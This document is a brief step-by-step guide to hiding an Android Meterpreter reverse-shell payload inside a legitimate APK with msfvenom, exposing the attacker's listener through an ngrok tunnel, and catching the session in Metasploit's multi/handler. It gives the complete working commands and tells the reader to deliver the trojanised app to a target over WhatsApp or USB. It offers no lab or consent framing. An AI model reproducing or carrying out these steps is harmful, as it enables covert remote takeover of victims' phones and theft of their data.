Prerequisites

1.ngrok: A tool for creating secure tunnels to your localhost.
2.apktool: A tool for reverse engineering Android APK files.
3.Metasploit Framework: A penetration testing framework.
4.msfvenom: A tool for generating payloads.
5.APK File: The target APK you want to modify.


1. Set Up ngrok
   : sudo ngrok tcp <any port>


open new terminal : ctrl+shift+n

2. Generate a Malicious APK
     : sudo msfvenom --platform android -x <Path_of_original_apk> -p android/meterpreter/reverse_tcp LHOST=<ngrok_forwarding_address> LPORT=<port> -a dalvik -f raw -o <name_of_output_apk>

3. Send the Malicious APK
   Distribute the generated APK file to your target via any method (e.g., WhatsApp, USB, etc.).

open new terminal : ctrl+shift+n


4. Start Metasploit Framework
   : msfconsole -q
5. Set Up the Metasploit Handler
   : use exploit/multi/handler
   
   Configure the payload settings:
     set payload android/meterpreter/reverse_tcp
     set LHOST 0.0.0.0
     set LPORT <port you give at ngrok>
    
     LHOST: Use 0.0.0.0 to listen on any IP address.
     <port>: The port number used in ngrok (e.g., 4444).
   
   Start the handler: run

6. Verify the Session
   : sysinfo

